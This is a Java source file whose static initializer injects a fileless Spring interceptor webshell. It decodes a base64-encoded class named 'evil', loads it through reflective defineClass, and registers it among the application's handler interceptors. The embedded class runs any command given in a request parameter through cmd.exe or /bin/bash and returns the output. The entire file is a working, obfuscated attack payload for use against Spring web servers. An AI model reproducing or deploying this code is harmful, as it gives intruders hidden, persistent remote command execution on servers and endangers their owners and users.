import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.ServletContext;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;


public class TouchFilea {
    static {
        ServletContext sss = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();
        org.springframework.web.context.WebApplicationContext context  = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(sss);
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
        java.lang.reflect.Field field = null;
        try {
            field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = null;
        try {
            adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        String className = "evil";
        String b64 = "yv66vgAAADQAmAoAIgBSCAA9CwBTAFQLAFUAVggAVwoAWABZCgALAFoIAFsKAAsAXAcAXQcAXggAXwgAYAoACgBhCABiCABjCgAKAGQKAAoAZQcAZgcAZwoAaABpCgAUAGoKABMAawoAEwBsCQBYAG0KAG4AbwoAcABvCgBwAHEKAHAAcgcAcwsAIwB0CwAjAHUHAHYHAHcHAHgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxldmlsOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEAAXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBeBwB5BwBdBwB2BwB6BwB7BwB3BwBzAQAKRXhjZXB0aW9ucwEACnBvc3RIYW5kbGUBAJIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzspVgEADG1vZGVsQW5kVmlldwEALkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzsBAA9hZnRlckNvbXBsZXRpb24BAHkoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvRXhjZXB0aW9uOylWAQACZXgBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAApTb3VyY2VGaWxlAQAJZXZpbC5qYXZhDAAkACUHAHoMAHwAfQcAewwAfgB/AQAHb3MubmFtZQcAgAwAgQB9DACCAIMBAAN3aW4MAIQAhQEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACQAhgEACS9iaW4vYmFzaAEAAi1jDACHAIgMAIkAigEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCLDACMAI0MACQAjgwAJACPDACQAIMMAJEAkgcAkwwAlACVBwB5DACWACUMAJcAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAEgASQwATABNAQAEZXZpbAEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEABWNsb3NlACEAIQAiAAEAIwAAAAQAAQAkACUAAQAmAAAALwABAAEAAAAFKrcAAbEAAAACACcAAAAGAAEAAAAPACgAAAAMAAEAAAAFACkAKgAAAAEAKwAsAAIAJgAAAboABgAKAAAArisSArkAAwIAOgQZBMYAoCy5AAQBADoFEgW4AAa2AAcSCLYACZkAIrsAClkGvQALWQMSDFNZBBINU1kFGQRTtwAOOganAB+7AApZBr0AC1kDEg9TWQQSEFNZBRkEU7cADjoGGQYEtgARVxkGtgASOge7ABNZuwAUWRkHtgAVtwAWtwAXOggZCLYAGDoJsgAZGQm2ABoZBRkJtgAbGQW2ABwZBbYAHacABToFA6wErAABAA8ApQCoAB4AAwAnAAAASgASAAAALgAKAC8ADwAxABcAMwAnADQARgA2AGIAOABpADkAcAA6AIUAOwCMADwAlAA9AJsAPgCgAD8ApQBBAKgAQACqAEIArABEACgAAABwAAsAQwADAC0ALgAGABcAjgAvADAABQBiAEMALQAuAAYAcAA1ADEAMgAHAIUAIAAzADQACACMABkANQA2AAkAAACuACkAKgAAAAAArgA3ADgAAQAAAK4AOQA6AAIAAACuADsAPAADAAoApAA9ADYABAA+AAAALAAF/QBGBwA/BwBA/AAbBwBB/wBFAAUHAEIHAEMHAEQHAEUHAD8AAQcARgEBAEcAAAAEAAEAHgABAEgASQACACYAAABgAAUABQAAAAoqKywtGQS3AB+xAAAAAgAnAAAACgACAAAASQAJAEoAKAAAADQABQAAAAoAKQAqAAAAAAAKADcAOAABAAAACgA5ADoAAgAAAAoAOwA8AAMAAAAKAEoASwAEAEcAAAAEAAEAHgABAEwATQACACYAAABgAAUABQAAAAoqKywtGQS3ACCxAAAAAgAnAAAACgACAAAATgAJAE8AKAAAADQABQAAAAoAKQAqAAAAAAAKADcAOAABAAAACgA5ADoAAgAAAAoAOwA8AAMAAAAKAE4ATwAEAEcAAAAEAAEAHgABAFAAAAACAFE="; // magicInterceptor 类 class 的 base64 编码
        byte[] bytes = new byte[0];
        try {
            bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            classLoader.loadClass(className);
        }catch (ClassNotFoundException e){
            java.lang.reflect.Method m0 = null;
            try {
                m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            } catch (NoSuchMethodException noSuchMethodException) {
                noSuchMethodException.printStackTrace();
            }
            m0.setAccessible(true);
            try {
                m0.invoke(classLoader, className, bytes, 0, bytes.length);
            } catch (IllegalAccessException illegalAccessException) {
                illegalAccessException.printStackTrace();
            } catch (InvocationTargetException invocationTargetException) {
                invocationTargetException.printStackTrace();
            }
            try {
                adaptedInterceptors.add(classLoader.loadClass(className).newInstance());
            } catch (InstantiationException instantiationException) {
                instantiationException.printStackTrace();
            } catch (IllegalAccessException illegalAccessException) {
                illegalAccessException.printStackTrace();
            } catch (ClassNotFoundException classNotFoundException) {
                classNotFoundException.printStackTrace();
            }
        }
    }
}